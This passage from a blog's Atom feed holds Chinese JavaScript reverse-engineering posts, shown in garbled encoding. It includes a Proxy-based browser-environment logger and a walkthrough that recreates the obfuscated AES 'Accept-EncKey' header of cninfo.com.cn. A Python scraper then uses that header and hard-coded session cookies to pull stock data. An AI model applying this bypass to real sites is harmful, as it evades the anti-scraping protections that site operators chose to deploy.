&#123;</span><br><span class="line">                    <span class="title function_">get</span>(<span class="params">target, property, receiver</span>) &#123;</span><br><span class="line">                        <span class="keyword">const</span> propValue = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, property, receiver);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ–¹æ³•:&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;å¯¹è±¡:&quot;</span>, <span class="string">`<span class="subst">$&#123;key&#125;</span>`</span>, <span class="string">&quot;å±æ€§:&quot;</span>, property, <span class="string">&quot;å±æ€§ç±»å‹:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> property&#125;</span>`</span>, <span class="string">&quot;å±æ€§å€¼:&quot;</span>, propValue, <span class="string">&quot;å±æ€§å€¼ç±»å‹:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> propValue&#125;</span>`</span>);</span><br><span class="line">                        <span class="keyword">return</span> propValue;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="title function_">set</span>(<span class="params">target, property, newValue, receiver</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ–¹æ³•:&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;å¯¹è±¡:&quot;</span>, <span class="string">`<span class="subst">$&#123;key&#125;</span>`</span>, <span class="string">&quot;å±æ€§:&quot;</span>, property, <span class="string">&quot;å±æ€§ç±»å‹:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> property&#125;</span>`</span>, <span class="string">&quot;å±æ€§å€¼:&quot;</span>, newValue, <span class="string">&quot;å±æ€§å€¼ç±»å‹:&quot;</span>, <span class="string">`<span class="subst">$&#123;<span class="keyword">typeof</span> newValue&#125;</span>`</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, property, newValue, receiver);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿™é‡Œéœ€è¦å†™å¯¹è±¡</span></span><br><span class="line"><span class="keyword">const</span> proxyObjs = [<span class="variable language_">window</span>, <span class="variable language_">document</span>, navigator,location,<span class="variable language_">localStorage</span>,history,screen];</span><br><span class="line"><span class="title class_">ProxyDocumentObjects</span>(proxyObjs);</span><br></pre></td></tr></table></figure><p>ä¸€è·¯è¡¥ç¯å¢ƒå°±å®Œäº‹äº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102160402190.png" alt="image-20251102160402190"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é€†å‘ç‚¹åœ¨è¿™ä¸ªå‚æ•°çš„må€¼ï¼Œtæ˜¯æ—¶é—´æˆ³ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102151137802.png&quot; alt=&quot;im</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-æŸæŸä¿¡æ•°æ®æœåŠ¡å¹³å°</title>
    <link href="https://250wuyifan.github.io/2025/10/30/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E4%BF%A1%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0/"/>
    <id>https://250wuyifan.github.io/2025/10/30/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E4%BF%A1%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0/</id>
    <published>2025-10-30T12:45:25.000Z</published>
    <updated>2025-10-30T15:38:54.705Z</updated>
    
    <content type="html"><![CDATA[<p>é€†å‘ç‚¹ï¼Œè¯·æ±‚å¤´æœ‰ä¸ªåŠ å¯†çš„ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221604677.png" alt="image-20251030221604677"></p><p>ç›´æ¥å‘åŒ…ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030205303469.png" alt="image-20251030205303469"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221615317.png" alt="image-20251030221615317"></p><p>è·Ÿäº†å‡ ä¸ªï¼Œå‘ç°å½¢å¼éƒ½ä¸€æ ·ï¼Œç›´æ¥æœç´¢api</p><p>â€˜&#x2F;api&#x2F;sysapi&#x2F;p_sysapi1007â€™</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030232747683.png" alt="image-20251030232747683"></p><p>è¿›å…¥</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030233254428.png" alt="image-20251030233254428"></p><p>ä¸‹é¢è¿™ä¸ªå¯ä»¥å¹³æ›¿ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_0x4f66ed = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030233235255.png" alt="image-20251030233235255"></p><p>è¿™é‡Œè¿›è¡ŒåŠ å¯†å¯ä»¥ç›´æ¥æ•°ç»„å½¢å¼è¾“å‡ºè¾“å…¥ï¼Œç„¶åæ›¿æ¢å³å¯</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030233453545.png" alt="image-20251030233453545"></p><h1 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å¼•å…¥ crypto-js</span></span><br><span class="line">_0x4f66ed = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. å®šä¹‰ _0x247b74 é…ç½®å¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> _0x247b74 = &#123;</span><br><span class="line">    <span class="string">&#x27;harmQ&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x38b5f0, _0x3875da</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _0x38b5f0 / _0x3875da;  <span class="comment">// é™¤æ³•è¿ç®—</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. æ¨¡æ‹Ÿ localStorageï¼ˆNode.js ç¯å¢ƒéœ€è¦ï¼‰</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">localStorage</span> = &#123;</span><br><span class="line">    <span class="attr">getItem</span>: <span class="keyword">function</span>(<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// è¿”å› null ä¼šä½¿ç”¨é»˜è®¤å€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. getResCode å‡½æ•°</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getResCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x188aa7 = _0x4f66ed[<span class="string">&#x27;AES&#x27;</span>][<span class="string">&#x27;encrypt&#x27;</span>](</span><br><span class="line">        _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Utf8&#x27;</span>][<span class="string">&#x27;parse&#x27;</span>](<span class="title class_">Math</span>[<span class="string">&#x27;floor&#x27;</span>](_0x247b74[<span class="string">&#x27;harmQ&#x27;</span>](<span class="keyword">new</span> <span class="title class_">Date</span>()[<span class="string">&#x27;getTime&#x27;</span>](), -<span class="number">0xe</span> * <span class="number">0x184</span> + -<span class="number">0x1a80</span> + <span class="number">0x33a0</span>))), </span><br><span class="line">        _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Utf8&#x27;</span>][<span class="string">&#x27;parse&#x27;</span>](<span class="variable language_">localStorage</span>[<span class="string">&#x27;getItem&#x27;</span>](<span class="string">&#x27;tempenc&#x27;</span>) || <span class="string">&#x27;1234567887654321&#x27;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;iv&#x27;</span>: _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Utf8&#x27;</span>][<span class="string">&#x27;parse&#x27;</span>](<span class="string">&#x27;1234567887654321&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span>: _0x4f66ed[<span class="string">&#x27;mode&#x27;</span>][<span class="string">&#x27;CBC&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;padding&#x27;</span>: _0x4f66ed[<span class="string">&#x27;pad&#x27;</span>][<span class="string">&#x27;Pkcs7&#x27;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> _0x4f66ed[<span class="string">&#x27;enc&#x27;</span>][<span class="string">&#x27;Base64&#x27;</span>][<span class="string">&#x27;stringify&#x27;</span>](_0x188aa7[<span class="string">&#x27;ciphertext&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getResCode</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. è¯»å– JS ä»£ç </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.js&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    js_code = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ç¼–è¯‘ JS ä»£ç </span></span><br><span class="line">js_compile = execjs.<span class="built_in">compile</span>(js_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. åŠ¨æ€ç”Ÿæˆ Accept-EncKey</span></span><br><span class="line">EncKey = js_compile.call(<span class="string">&quot;getResCode&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;âœ… ç”Ÿæˆçš„ Accept-EncKey: <span class="subst">&#123;EncKey&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. è®¾ç½®è¯·æ±‚å‚æ•°</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;Hm_lvt_489bd07e99fbfc5f12cbb4145adb0a9b&#x27;</span>: <span class="string">&#x27;1761823133&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Hm_lpvt_489bd07e99fbfc5f12cbb4145adb0a9b&#x27;</span>: <span class="string">&#x27;1761823133&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;HMACCOUNT&#x27;</span>: <span class="string">&#x27;4160D16E28E71D0D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MALLSSID&#x27;</span>: <span class="string">&#x27;75664F2F4B354252375331744B5662564C41393062734C4C6A684F5178674A574759692B794E4B75687166585956696577313643434847734B645744424B6F32&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-EncKey&#x27;</span>: EncKey,  <span class="comment"># ä½¿ç”¨åŠ¨æ€ç”Ÿæˆçš„åŠ å¯†å¯†é’¥</span></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://webapi.cninfo.com.cn&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://webapi.cninfo.com.cn/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Google Chrome&quot;;v=&quot;141&quot;, &quot;Not?A_Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;141&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;macOS&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tdate&#x27;</span>: <span class="string">&#x27;2025-10-29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;market&#x27;</span>: <span class="string">&#x27;SZE&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. å‘é€è¯·æ±‚</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;â³ æ­£åœ¨å‘é€è¯·æ±‚...&quot;</span>)</span><br><span class="line">response = requests.post(</span><br><span class="line">    <span class="string">&#x27;https://webapi.cninfo.com.cn/api/sysapi/p_sysapi1007&#x27;</span>, </span><br><span class="line">    cookies=cookies, </span><br><span class="line">    headers=headers, </span><br><span class="line">    data=data</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. å¤„ç†å“åº”æ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;âœ… å“åº”çŠ¶æ€ç : <span class="subst">&#123;response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = response.json()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> result.get(<span class="string">&#x27;resultcode&#x27;</span>) == <span class="number">200</span>:</span><br><span class="line">        records = result.get(<span class="string">&#x27;records&#x27;</span>, [])</span><br><span class="line">        total_count = result.get(<span class="string">&#x27;count&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Š è·å–åˆ° <span class="subst">&#123;<span class="built_in">len</span>(records)&#125;</span> æ¡æ•°æ®ï¼ˆæ€»è®¡ <span class="subst">&#123;total_count&#125;</span> æ¡ï¼‰\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> records:</span><br><span class="line">            <span class="comment"># è½¬æ¢ä¸º DataFrame</span></span><br><span class="line">            df = pd.DataFrame(records)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># é‡æ–°æ’åˆ—åˆ—é¡ºåºï¼ˆæŠŠé‡è¦çš„åˆ—æ”¾å‰é¢ï¼‰</span></span><br><span class="line">            column_order = [</span><br><span class="line">                <span class="string">&#x27;è¯åˆ¸ä»£ç &#x27;</span>, <span class="string">&#x27;è¯åˆ¸ç®€ç§°&#x27;</span>, <span class="string">&#x27;äº¤æ˜“æ—¥æœŸ&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;å¼€ç›˜ä»·&#x27;</span>, <span class="string">&#x27;æ”¶ç›˜ä»·&#x27;</span>, <span class="string">&#x27;æœ€é«˜ä»·&#x27;</span>, <span class="string">&#x27;æœ€ä½ä»·&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;æ¶¨è·Œ&#x27;</span>, <span class="string">&#x27;æ¶¨è·Œå¹…&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;æˆäº¤æ•°é‡&#x27;</span>, <span class="string">&#x27;æˆäº¤é‡‘é¢&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;äº¤æ˜“æ‰€&#x27;</span>, <span class="string">&#x27;å¸ç§&#x27;</span></span><br><span class="line">            ]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ä¿ç•™æ‰€æœ‰åˆ—ï¼Œä½†æŠŠé‡è¦çš„æ”¾å‰é¢</span></span><br><span class="line">            other_columns = [col <span class="keyword">for</span> col <span class="keyword">in</span> df.columns <span class="keyword">if</span> col <span class="keyword">not</span> <span class="keyword">in</span> column_order]</span><br><span class="line">            df = df[column_order + other_columns]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç”Ÿæˆæ–‡ä»¶åï¼ˆå¸¦æ—¶é—´æˆ³ï¼‰</span></span><br><span class="line">            timestamp = datetime.now().strftime(<span class="string">&quot;%Y%m%d_%H%M%S&quot;</span>)</span><br><span class="line">            filename = <span class="string">f&quot;æ·±è¯ä¿¡æ•°æ®_<span class="subst">&#123;data[<span class="string">&#x27;market&#x27;</span>]&#125;</span>_<span class="subst">&#123;data[<span class="string">&#x27;tdate&#x27;</span>].replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#x27;</span>)&#125;</span>_<span class="subst">&#123;timestamp&#125;</span>.xlsx&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ä¿å­˜ä¸º Excel</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ğŸ’¾ æ­£åœ¨ä¿å­˜åˆ° Excel æ–‡ä»¶: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ä½¿ç”¨ ExcelWriter ä»¥ä¾¿è®¾ç½®æ ¼å¼</span></span><br><span class="line">            <span class="keyword">with</span> pd.ExcelWriter(filename, engine=<span class="string">&#x27;openpyxl&#x27;</span>) <span class="keyword">as</span> writer:</span><br><span class="line">                df.to_excel(writer, sheet_name=<span class="string">&#x27;è‚¡ç¥¨æ•°æ®&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è·å–å·¥ä½œè¡¨å¯¹è±¡</span></span><br><span class="line">                worksheet = writer.sheets[<span class="string">&#x27;è‚¡ç¥¨æ•°æ®&#x27;</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è‡ªåŠ¨è°ƒæ•´åˆ—å®½</span></span><br><span class="line">                <span class="keyword">for</span> column <span class="keyword">in</span> df.columns:</span><br><span class="line">                    column_idx = df.columns.get_loc(column)</span><br><span class="line">                    max_length = <span class="built_in">max</span>(</span><br><span class="line">                        df[column].astype(<span class="built_in">str</span>).apply(<span class="built_in">len</span>).<span class="built_in">max</span>(),  <span class="comment"># æ•°æ®æœ€å¤§é•¿åº¦</span></span><br><span class="line">                        <span class="built_in">len</span>(<span class="built_in">str</span>(column))  <span class="comment"># åˆ—åé•¿åº¦</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="comment"># è®¾ç½®åˆ—å®½ï¼ˆåŠ ä¸€ç‚¹ä½™é‡ï¼‰</span></span><br><span class="line">                    worksheet.column_dimensions[<span class="built_in">chr</span>(<span class="number">65</span> + column_idx)].width = <span class="built_in">min</span>(max_length + <span class="number">2</span>, <span class="number">50</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å†»ç»“é¦–è¡Œ</span></span><br><span class="line">                worksheet.freeze_panes = <span class="string">&#x27;A2&#x27;</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æ·»åŠ ç­›é€‰</span></span><br><span class="line">                worksheet.auto_filter.ref = worksheet.dimensions</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âœ… æ•°æ®å·²æˆåŠŸä¿å­˜åˆ°: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“‹ æ•°æ®é¢„è§ˆï¼ˆå‰5æ¡ï¼‰:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(df.head().to_string())</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“ˆ æ•°æ®ç»Ÿè®¡:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - æ€»è¡Œæ•°: <span class="subst">&#123;<span class="built_in">len</span>(df)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - æ€»åˆ—æ•°: <span class="subst">&#123;<span class="built_in">len</span>(df.columns)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - æ¶¨åœè‚¡ç¥¨: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;æ¶¨è·Œå¹…&#x27;</span>] &gt;= <span class="number">9.9</span>])&#125;</span> åª&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - è·Œåœè‚¡ç¥¨: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;æ¶¨è·Œå¹…&#x27;</span>] &lt;= -<span class="number">9.9</span>])&#125;</span> åª&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - ä¸Šæ¶¨è‚¡ç¥¨: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;æ¶¨è·Œ&#x27;</span>] &gt; <span class="number">0</span>])&#125;</span> åª&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - ä¸‹è·Œè‚¡ç¥¨: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;æ¶¨è·Œ&#x27;</span>] &lt; <span class="number">0</span>])&#125;</span> åª&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - å¹³ç›˜è‚¡ç¥¨: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;æ¶¨è·Œ&#x27;</span>] == <span class="number">0</span>])&#125;</span> åª&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;âŒ æ²¡æœ‰è·å–åˆ°æ•°æ®&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ è¯·æ±‚å¤±è´¥: <span class="subst">&#123;result.get(<span class="string">&#x27;resultmsg&#x27;</span>, <span class="string">&#x27;æœªçŸ¥é”™è¯¯&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;âŒ å¤„ç†æ•°æ®æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;åŸå§‹å“åº”: <span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221453689.png" alt="image-20251030221453689"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030232510951.png" alt="image-20251030232510951"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030232442372.png" alt="image-20251030232442372"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é€†å‘ç‚¹ï¼Œè¯·æ±‚å¤´æœ‰ä¸ªåŠ å¯†çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221604677.png&quot; alt=&quot;image-2</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
